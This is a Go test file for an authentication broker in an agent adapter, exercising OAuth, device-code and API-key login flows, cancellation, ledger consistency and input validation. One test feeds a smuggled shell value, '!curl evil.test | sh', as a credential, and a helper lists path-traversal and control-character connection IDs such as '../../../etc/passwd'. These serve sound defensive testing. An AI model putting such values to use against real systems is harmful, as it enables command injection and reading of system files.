package piacp

import (
	"context"
	"encoding/json"
	"errors"
	"maps"
	"os"
	"strings"
	"testing"

	"github.com/coder/acp-go-sdk"
	"github.com/stretchr/testify/require"

	"github.com/savid/acp-go-pi/internal/pi"
)

const (
	authTestURL      = "https://provider.test/authorize?client_id=abc"
	authTestVerify   = "https://provider.test/device"
	authTestUserCode = "ABCD-EFGH"
)

func authorizeParams(harness *authHarness, providerID string, generation string, method string) map[string]any {
	return map[string]any{
		authFieldSessionID:          string(harness.session.id),
		authFieldProviderID:         providerID,
		authFieldConnectionID:       "conn-1",
		authFieldMethodsGeneration:  generation,
		authFieldMethod:             method,
		authFieldAuthorizeRequestID: "req-1",
	}
}

// scriptManualCodeLogin models pi's anthropic shape: an auth_url event, then a
// manual-code prompt the callback leg answers, then the terminal result.
func scriptManualCodeLogin(harness *authHarness, code string, result pi.AuthMessage) {
	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		if request.Op != pi.AuthOpLogin {
			return nil
		}

		harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: authTestURL, Instructions: "Complete login in your browser."},
		})

		parked := harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptManualCode,
			Message: "Paste the authorization code here",
		})

		answer := harness.awaitAnswer(parked)
		if answer.Value == nil || *answer.Value != code {
			return errors.New("unexpected callback value")
		}

		result.ID = request.ID
		result.Kind = pi.AuthKindResult
		harness.deliver(ctx, result)

		return nil
	})
}

// scriptDeviceCodeLogin models pi's xai shape: the login raises its abort
// watch, notifies one device-code presentation, and then polls the provider,
// returning nothing to the extension until the provider settles or the wrapper
// answers the watch.
func scriptDeviceCodeLogin(harness *authHarness, settled <-chan pi.AuthMessage) {
	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		if request.Op != pi.AuthOpLogin {
			return nil
		}

		watch := harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindCancel})

		harness.deliver(ctx, pi.AuthMessage{
			ID:   request.ID,
			Kind: pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{
				Type:            authNativeEventDeviceCode,
				UserCode:        authTestUserCode,
				VerificationURI: authTestVerify,
				IntervalSeconds: 5,
			},
		})

		select {
		case message := <-settled:
			message.ID = request.ID
			message.Kind = pi.AuthKindResult
			harness.deliver(ctx, message)
		case <-harness.answered(watch):
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, Cause: authCauseProviderRefused})
		case <-ctx.Done():
		}

		return nil
	})
}

func startDeviceCodeFlow(t *testing.T, harness *authHarness, settled <-chan pi.AuthMessage) authAuthorizeResult {
	t.Helper()

	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptDeviceCodeLogin(harness, settled)

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	return authorizeResult(t, authorized)
}

func (h *authHarness) statusOf(flowID string) authStatusResult {
	result, err := h.call(h.t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(h.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(h.t, err)

	status, ok := result.(authStatusResult)
	require.True(h.t, ok)

	return status
}

// TestAbortWatchWithoutAFlowIsDismissed pins that a watch raised on a plain
// command exchange is dismissed rather than left open forever.
func TestAbortWatchWithoutAFlowIsDismissed(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	harness.broker.registerExchange("ex-1", nil)

	harness.deliver(t.Context(), pi.AuthMessage{ID: "ex-1", Kind: pi.AuthKindCancel})
	require.True(t, harness.lastResponse().Cancelled)
}

// TestSettleRefusesAnAnswerIntoAClosedFlow pins that a native answer arriving
// after the flow terminalized confirms nothing and transitions nothing. The
// ledger entry it would have written binds a resident credential to a
// connection generation the owner already closed.
func TestSettleRefusesAnAnswerIntoAClosedFlow(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		state string
		cause string
	}{
		{name: "cancelled", state: authStateCancelled, cause: authCauseFlowCancelled},
		{name: "expired", state: authStateExpired, cause: authCauseFlowState},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			harness := newAuthHarness(t)
			flow := &authFlow{
				id:         "flow-closed",
				sessionID:  harness.session.id,
				providerID: "anthropic",
				state:      testCase.state,
				method:     authCatalogMethod{ID: authMethodTypeOAuth, Type: authMethodTypeOAuth},
				decidable:  make(chan struct{}),
				ready:      make(chan struct{}),
				result:     make(chan pi.AuthMessage, 1),
				disarm:     make(chan struct{}),
			}
			flow.result <- pi.AuthMessage{Kind: pi.AuthKindResult, OK: true}

			_, err := harness.broker.settle(t.Context(), flow, authStateAuthenticated)
			requireAuthFailed(t, err, testCase.cause)

			_, ok, readErr := harness.broker.ledger.read("anthropic")
			require.NoError(t, readErr)
			require.False(t, ok)
		})
	}
}

// TestSettleReportsASecretThatLandedIntoAClosedFlow pins the secret leg against
// the oauth one it shares settle with. Its value crossed at the prompt and pi's
// write needs no provider exchange a cancel could pre-empt, so a native
// acceptance that arrives after the owner closed the flow describes a credential
// the agent directory now holds. Answering a no-transition cause over it would
// leave that credential bound to nothing, so the confirmation is written and the
// leg reports what landed — while the terminal record stays the owner's.
func TestSettleReportsASecretThatLandedIntoAClosedFlow(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flow := &authFlow{
		id:           "flow-secret",
		sessionID:    harness.session.id,
		providerID:   "openai",
		connectionID: "conn-1",
		state:        authStateCancelled,
		reason:       authReasonOwnerCancel,
		method:       authCatalogMethod{ID: authMethodTypeAPI, Type: authMethodTypeAPI},
		decidable:    make(chan struct{}),
		ready:        make(chan struct{}),
		result:       make(chan pi.AuthMessage, 1),
		disarm:       make(chan struct{}),
	}
	flow.result <- pi.AuthMessage{Kind: pi.AuthKindResult, OK: true, CredType: "api_key"}

	result, err := harness.broker.settle(t.Context(), flow, authStateSaved)
	require.NoError(t, err)
	require.Equal(t, authFlowIDResult{FlowID: flow.id}, result)

	record, ok, readErr := harness.broker.ledger.read("openai")
	require.NoError(t, readErr)
	require.True(t, ok)
	require.Equal(t, authLedgerConfirmed, record.State)

	harness.broker.mu.Lock()
	defer harness.broker.mu.Unlock()

	require.Equal(t, authStateCancelled, flow.state)
	require.Equal(t, authReasonOwnerCancel, flow.reason)
}

func startManualCodeFlow(t *testing.T, harness *authHarness, code string, result pi.AuthMessage) string {
	t.Helper()

	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, code, result)

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	return authorizeResult(t, authorized).FlowID
}

func authorizeResult(t *testing.T, value any) authAuthorizeResult {
	t.Helper()

	result, ok := value.(authAuthorizeResult)
	require.True(t, ok)

	return result
}

// authorizeCall is one authorize leg answered off the calling goroutine, so a
// test can observe whether a concurrent repeat waits.
type authorizeCall struct {
	result any
	err    error
}

func callAuthorize(harness *authHarness, params map[string]any) authorizeCall {
	result, err := harness.call(context.WithoutCancel(harness.t.Context()), AuthAuthorizeMethod, params)

	return authorizeCall{result: result, err: err}
}

func authFailureFlowID(t *testing.T, err error) string {
	t.Helper()

	var requestError *acp.RequestError
	require.ErrorAs(t, err, &requestError)

	data, ok := requestError.Data.(map[string]any)
	require.True(t, ok)

	flowID, ok := data[authFieldFlowID].(string)
	require.True(t, ok)

	return flowID
}

// TestAuthorizeReplayHonoursCallerCancellation pins that a caller walking away
// from a repeat releases the leg rather than blocking on a mint nobody is
// waiting for.
func TestAuthorizeReplayHonoursCallerCancellation(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	key := authFlowKey{sessionID: harness.session.id, providerID: "anthropic"}

	harness.broker.mu.Lock()
	harness.broker.retained[key] = &authFlow{
		id:                 "flow-1",
		providerID:         "anthropic",
		authorizeRequestID: "req-1",
		ready:              make(chan struct{}),
	}
	harness.broker.mu.Unlock()

	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	_, replayed, err := harness.broker.replayAuthorize(ctx, key, "req-1")
	require.True(t, replayed)
	requireAuthFailed(t, err, authCauseTimeout)
}

func TestAuthorizeFencesGenerationAndMethod(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	stale := authorizeParams(harness, "anthropic", "stale-generation", authMethodTypeOAuth)
	_, err := harness.call(t.Context(), AuthAuthorizeMethod, stale)
	requireInvalidParams(t, err)

	unknown := authorizeParams(harness, "anthropic", generation, "nope")
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, unknown)
	requireInvalidParams(t, err)

	unlisted := authorizeParams(harness, "unlisted", generation, authMethodTypeOAuth)
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, unlisted)
	requireInvalidParams(t, err)
}

// TestAuthorizeBeforeAnyCatalogFailsClosed pins that a method id means nothing
// without the generation that produced it.
func TestAuthorizeBeforeAnyCatalogFailsClosed(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", "any", authMethodTypeOAuth))
	requireInvalidParams(t, err)
}

func TestAuthorizeRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	for _, field := range []string{
		authFieldSessionID, authFieldProviderID, authFieldConnectionID,
		authFieldMethodsGeneration, authFieldMethod, authFieldAuthorizeRequestID,
	} {
		params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
		delete(params, field)

		_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
		requireInvalidParams(t, err)
	}

	extra := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	extra["injectionKey"] = "x"
	_, err := harness.call(t.Context(), AuthAuthorizeMethod, extra)
	requireInvalidParams(t, err)

	badInputs := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	badInputs[authFieldInputs] = "not an object"
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, badInputs)
	requireInvalidParams(t, err)

	// pi's enumeration declares no prompts, so any answer names one nobody
	// advertised.
	withInputs := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	withInputs[authFieldInputs] = map[string]string{"account": "acme"}
	_, err = harness.call(t.Context(), AuthAuthorizeMethod, withInputs)
	requireInvalidParams(t, err)

	_, err = harness.call(t.Context(), AuthAuthorizeMethod, "not-an-object")
	requireInvalidParams(t, err)
}

// TestAuthorizeUnknownSessionRejected pins the uniform unknown-session answer.
func TestAuthorizeUnknownSessionRejected(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)
	params[authFieldSessionID] = "missing"

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.Error(t, err)
}

func TestAuthorizeVetoesUnusablePresentation(t *testing.T) {
	t.Parallel()

	cases := map[string]*pi.AuthNativeEvent{
		"non-https url":     {Type: authNativeEventAuthURL, URL: "http://provider.test/a"},
		"bad verify uri":    {Type: authNativeEventDeviceCode, URL: "", VerificationURI: "http://provider.test/d", UserCode: authTestUserCode},
		"bad user code":     {Type: authNativeEventDeviceCode, VerificationURI: authTestVerify, UserCode: "</script>AB"},
		"unreadable notice": {Type: "progress", Message: "Listening on http://127.0.0.1:1455"},
	}

	for name, event := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			harness := newAuthHarness(t)
			generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

			harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
				harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindEvent, Event: event})
				harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, Cause: authCauseProviderRefused})

				return nil
			})

			_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
			require.Error(t, err)
		})
	}
}

// TestAuthorizeAPIMethodMintsNothing pins the secret interaction: an api-key
// method has nothing to mint and no native call at authorize.
func TestAuthorizeAPIMethodMintsNothing(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "an api-key authorize makes no native call")

		return nil
	})

	result, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	presentation := authorizeResult(t, result)
	require.Equal(t, authInteractionSecret, presentation.Interaction)
	require.Equal(t, "OpenAI API key", presentation.Message)
	require.Empty(t, presentation.URL)
	require.Empty(t, presentation.CallbackInput)
}

// TestCallbackAppliesSecretNatively pins that a secret flow reaches saved, never
// authenticated: no harness validates a secret at write time.
func TestCallbackAppliesSecretNatively(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	flowID := authorizeResult(t, authorized).FlowID

	submitted := make(chan string, 1)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		require.Equal(t, pi.AuthOpLogin, request.Op)
		require.Equal(t, pi.AuthMethodAPI, request.Method)

		prompt := harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptSecret,
			Message: "OpenAI API key",
		})

		answer := harness.awaitAnswer(prompt)
		require.NotNil(t, answer.Value)
		submitted <- *answer.Value

		harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true, CredType: "api_key"})

		return nil
	})

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldMethod:     authMethodTypeAPI,
		authFieldFlowID:     flowID,
		authFieldInput:      "sk-live-value",
	})
	require.NoError(t, err)
	require.Equal(t, "sk-live-value", <-submitted)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{FlowID: flowID, State: authStateSaved}, status)
}

func TestTerminalSecretFlowRetainsOnlyValuesFreeReplayState(t *testing.T) {
	harness := newAuthHarness(t)
	flowID := startSecretFlow(t, harness)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{
			ID: request.ID, Kind: pi.AuthKindResult, Cause: authCauseProviderRefused,
		})

		return nil
	})

	_, err := harness.call(t.Context(), AuthCallbackMethod, secretCallbackParams(harness, flowID))
	requireAuthFailed(t, err, authCauseProviderRefused)

	harness.broker.mu.Lock()
	flow := harness.broker.byID[flowID]
	require.Empty(t, flow.pendingSecret)
	harness.broker.mu.Unlock()

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID: string(harness.session.id), authFieldProviderID: "openai", authFieldFlowID: flowID,
	})
	require.NoError(t, err)
	encoded, err := json.Marshal(status)
	require.NoError(t, err)
	require.NotContains(t, string(encoded), "sk-live-value")

	_, err = harness.call(t.Context(), AuthCallbackMethod, secretCallbackParams(harness, flowID))
	requireAuthFailed(t, err, authCauseFlowState)
}

func TestTerminalRoutesClearPendingSecret(t *testing.T) {
	tests := []struct {
		name   string
		action func(*testing.T, *authHarness, *authFlow)
	}{
		{name: "native terminal", action: func(_ *testing.T, harness *authHarness, flow *authFlow) {
			harness.broker.terminalize(flow, authStateFailed, authReasonProviderRefused, 0)
		}},
		{name: "expiry", action: func(_ *testing.T, harness *authHarness, flow *authFlow) {
			harness.broker.expire(flow)
		}},
		{name: "supersede", action: func(t *testing.T, harness *authHarness, flow *authFlow) {
			t.Helper()
			harness.broker.supersede(t.Context(), authFlowKey{sessionID: flow.sessionID, providerID: flow.providerID}, authReasonSuperseded)
		}},
		{name: "owner cancellation", action: func(t *testing.T, harness *authHarness, flow *authFlow) {
			t.Helper()
			_, err := harness.call(t.Context(), AuthCancelMethod, map[string]any{
				authFieldSessionID:  string(flow.sessionID),
				authFieldProviderID: flow.providerID,
				authFieldFlowID:     flow.id,
			})
			require.NoError(t, err)
		}},
		{name: "session close", action: func(t *testing.T, harness *authHarness, _ *authFlow) {
			t.Helper()
			harness.broker.closeSession(t.Context(), harness.session)
		}},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			harness := newAuthHarness(t)
			flowID := startSecretFlow(t, harness)
			flow := harness.broker.byID[flowID]

			harness.broker.mu.Lock()
			flow.pendingSecret = "sk-live-value"
			harness.broker.mu.Unlock()

			test.action(t, harness, flow)

			harness.broker.mu.Lock()
			require.Empty(t, flow.pendingSecret)
			harness.broker.mu.Unlock()
		})
	}
}

// TestCallbackRefusesShellCredential pins the refusal that keeps a brokered
// value out of a field pi executes as a shell command.
func TestCallbackRefusesShellCredential(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "openai", generation, authMethodTypeAPI))
	require.NoError(t, err)

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a shell-shaped credential never reaches the harness")

		return nil
	})

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "openai",
		authFieldMethod:     authMethodTypeAPI,
		authFieldFlowID:     authorizeResult(t, authorized).FlowID,
		authFieldInput:      "!curl evil.test | sh",
	})
	requireInvalidParams(t, err)
}

func TestAuthNativeCause(t *testing.T) {
	t.Parallel()

	for _, cause := range []string{authCauseNativeVeto, authCauseHarvestFailed, authCauseProcess} {
		require.Equal(t, cause, authNativeCause(cause))
	}

	require.Equal(t, authCauseProviderRefused, authNativeCause(""))
	require.Equal(t, authCauseProviderRefused, authNativeCause("something native"))
}

func TestCancelRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	_, err := harness.call(t.Context(), AuthCancelMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	requireInvalidParams(t, err)
}

func TestDisconnectRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	base := map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	}

	for _, field := range []string{
		authFieldSessionID, authFieldProviderID, authFieldConnectionID, authFieldBindingGeneration,
	} {
		params := map[string]any{}
		maps.Copy(params, base)

		delete(params, field)

		_, err := harness.call(t.Context(), AuthDisconnectMethod, params)
		requireInvalidParams(t, err)
	}

	unknown := map[string]any{}
	maps.Copy(unknown, base)

	unknown[authFieldSessionID] = "missing"
	_, err := harness.call(t.Context(), AuthDisconnectMethod, unknown)
	require.Error(t, err)

	_, err = harness.call(t.Context(), AuthDisconnectMethod, json.RawMessage(`[]`))
	requireInvalidParams(t, err)
}

func TestNewAuthTokenReportsEntropyFailure(t *testing.T) {
	original := authRandRead
	authRandRead = func([]byte) (int, error) { return 0, errors.New("no entropy") }

	t.Cleanup(func() { authRandRead = original })

	_, err := newAuthToken()
	require.Error(t, err)
}

// failingAuthToken makes the nth mint fail so a leg's own token failure is
// reachable behind the exchange token it mints first.
func failingAuthToken(t *testing.T, after int) {
	t.Helper()

	original := authRandRead
	remaining := after

	authRandRead = func(value []byte) (int, error) {
		if remaining == 0 {
			return 0, errors.New("no entropy")
		}

		remaining--

		return original(value)
	}

	t.Cleanup(func() { authRandRead = original })
}

func TestAuthMethodsReportsGenerationMintFailure(t *testing.T) {
	harness := newAuthHarness(t)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindCatalog, Providers: defaultAuthProviders()})

		return nil
	})

	failingAuthToken(t, 1)

	_, err := harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	requireAuthFailed(t, err, authCauseProcess)
}

func TestAuthorizeReportsFlowMintFailure(t *testing.T) {
	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	failingAuthToken(t, 0)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseProcess)
}

func TestAuthorizeReportsLedgerWriteFailure(t *testing.T) {
	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	original := ledgerRename
	ledgerRename = func(string, string) error { return errors.New("rename") }

	t.Cleanup(func() { ledgerRename = original })

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseProcess)
}

func TestAuthorizePreservesUnreadableLedgerLineage(t *testing.T) {
	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	path := harness.broker.ledger.path("anthropic")
	corrupt := []byte(`{"providerId":"anthropic","revision":`)
	require.NoError(t, os.WriteFile(path, corrupt, authLedgerFileMode))

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "unreadable lineage must stop before native authorization")

		return nil
	})

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseProcess)

	contents, err := os.ReadFile(path)
	require.NoError(t, err)
	require.Equal(t, corrupt, contents)
}

// TestSettleLeavesASupersededFlowsSuccessorLedgerEntry pins the far edge of the
// resident-credential exception. The secret landed, so the leg still reaches
// confirm rather than leaving the credential bound to nothing — but a fresh
// authorize has meanwhile minted the provider's next revision, and that binding
// owns the entry. Renaming the closed flow's lineage over it would leave the
// host holding a generation the entry no longer names, which fails every later
// disconnect as a binding conflict and makes the credential unremovable.
func TestSettleLeavesASupersededFlowsSuccessorLedgerEntry(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	successor := authLedgerRecord{
		ProviderID:        "openai",
		ConnectionID:      "conn-1",
		Revision:          2,
		BindingGeneration: 1,
		FlowID:            "flow-successor",
		State:             authLedgerIntent,
	}
	require.NoError(t, harness.broker.ledger.write(successor))

	flow := &authFlow{
		id:                "flow-secret",
		sessionID:         harness.session.id,
		providerID:        "openai",
		connectionID:      "conn-1",
		revision:          1,
		bindingGeneration: 1,
		state:             authStateCancelled,
		reason:            authReasonSuperseded,
		method:            authCatalogMethod{ID: authMethodTypeAPI, Type: authMethodTypeAPI},
		decidable:         make(chan struct{}),
		ready:             make(chan struct{}),
		result:            make(chan pi.AuthMessage, 1),
		disarm:            make(chan struct{}),
	}
	flow.result <- pi.AuthMessage{Kind: pi.AuthKindResult, OK: true, CredType: "api_key"}

	_, err := harness.broker.settle(t.Context(), flow, authStateSaved)
	requireAuthFailed(t, err, authCauseFlowCancelled)

	record, ok, readErr := harness.broker.ledger.read("openai")
	require.NoError(t, readErr)
	require.True(t, ok)
	require.Equal(t, successor, record)
}

// TestSettleRefusesAConfirmationWhoseGenerationMovedUnderIt pins the same
// compare-and-set against a flow nobody closed. A disconnect bumps the binding
// generation before it touches anything else, so a login still running when the
// owner disconnects holds a binding the entry no longer names — and the caller
// has to hear that a fresh authorize is the remedy rather than a success.
func TestSettleRefusesAConfirmationWhoseGenerationMovedUnderIt(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	bumped := authLedgerRecord{
		ProviderID:        "openai",
		ConnectionID:      "conn-1",
		Revision:          1,
		BindingGeneration: 2,
		FlowID:            "flow-secret",
		State:             authLedgerIntent,
	}
	require.NoError(t, harness.broker.ledger.write(bumped))

	flow := &authFlow{
		id:                "flow-secret",
		sessionID:         harness.session.id,
		providerID:        "openai",
		connectionID:      "conn-1",
		revision:          1,
		bindingGeneration: 1,
		state:             authStatePending,
		method:            authCatalogMethod{ID: authMethodTypeAPI, Type: authMethodTypeAPI},
		decidable:         make(chan struct{}),
		ready:             make(chan struct{}),
		result:            make(chan pi.AuthMessage, 1),
		disarm:            make(chan struct{}),
	}
	flow.result <- pi.AuthMessage{Kind: pi.AuthKindResult, OK: true, CredType: "api_key"}

	_, err := harness.broker.settle(t.Context(), flow, authStateSaved)
	requireAuthFailed(t, err, authCauseBindingConflict)

	record, ok, readErr := harness.broker.ledger.read("openai")
	require.NoError(t, readErr)
	require.True(t, ok)
	require.Equal(t, bumped, record)

	// A binding conflict consumes nothing, so the flow is exactly as pending as
	// it was.
	harness.broker.mu.Lock()
	defer harness.broker.mu.Unlock()

	require.Equal(t, authStatePending, flow.state)
}

// adversarialConnectionIDs are the caller-minted values the bound refuses. Each
// is a shape the id would otherwise carry into a durable ledger entry and into
// the adapter's own logs, and the two replacement-rune spellings are one Go
// string reached from two different wire encodings, which aliases one
// connection onto another's entry.
func adversarialConnectionIDs() map[string]string {
	return map[string]string{
		"empty":              "",
		"path separators":    "../../../etc/passwd",
		"windows separators": `..\..\connection`,
		"newline":            "connection\n1",
		"nul":                "connection\x00 1",
		"bidi override":      "connection\u202e1",
		"space":              "connection 1",
		"colon":              "connection:1",
		"replacement rune":   "connection-�",
		"non ascii":          "connection-é",
		"unbounded":          strings.Repeat("c", authConnectionIDMaxBytes+1),
	}
}

func TestConnectionIDAcceptsTheOpaqueTokenAConsumerMints(t *testing.T) {
	t.Parallel()

	for _, connectionID := range []string{
		"pac_2f1c9b4e-8d3a-4c17-9f21-0b6e5a7c8d90",
		"conn-1",
		"C0",
		strings.Repeat("c", authConnectionIDMaxBytes),
	} {
		require.True(t, authValidConnectionID(connectionID), connectionID)
	}
}
